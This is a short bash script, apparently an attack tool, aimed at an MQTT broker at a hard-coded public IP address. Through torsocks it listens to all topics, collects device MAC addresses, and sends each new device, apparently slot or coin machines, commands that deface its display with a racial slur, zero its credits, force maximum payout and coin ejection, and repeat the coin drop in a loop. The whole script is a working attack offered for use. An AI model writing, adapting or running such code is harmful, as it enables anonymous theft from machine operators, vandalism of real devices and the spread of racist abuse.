#!/bin/bash
# FIXED - Anti-duplicate LIVE SLOT KILLER + unique MAC tracking
BROKER="188.14.144.138"
PORT="1883"
MSG='{"display":"TRUSTEDF57 CIAO NEGRO","neon":1,"permanent":true}'
declare -A HIT_MACS  # Memory per MAC unique

echo "[+] LIVE UNIQUE SLOT DESTROYER - No duplicates"

torsocks mosquitto_sub -h $BROKER -p $PORT -t '#' -v 2>/dev/null | \
while IFS= read -r line; do
  MAC=$(echo "$line" | grep -oE 'm/o/([0-9A-F]{20})' | cut -d'/' -f3 | head -1)
  
  if [ -n "$MAC" ] && [ ${HIT_MACS[$MAC]+_} ]; then
    # Skip già fatto
    continue
  fi
  
  if [ -n "$MAC" ]; then
    echo "[+] NEW TARGET: $MAC - FULL DESTROY"
    HIT_MACS[$MAC]=1  # Mark as hit
    
    # DEFACE MASSICCIO
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "m/k/$MAC" -m "$MSG" &
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "m/display/$MAC" -m "$MSG" &
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "m/o/$MAC" -m "{\"text\":\"TRUSTEDF57 CIAO NEGRO\",\"mode\":\"override\"}" &
    
    # SVUOTA + MAX COIN DROP
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "m/o/$MAC" -m '{"credits":0,"drop":"MAXIMUM","hopper":"EMPTY"}' &
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "m/k/$MAC" -m '{"payout":"MAX","eject":true}' &
    
    # DROP LOOP MAX POWER
    for i in {1..15}; do
      torsocks mosquitto_pub -h $BROKER -p $PORT -t "m/o/$MAC" -m "{\"drop\":\"MAX\",\"coins\":9999999,\"cycle\":$i}" &
      sleep 0.2
    done
  fi
done
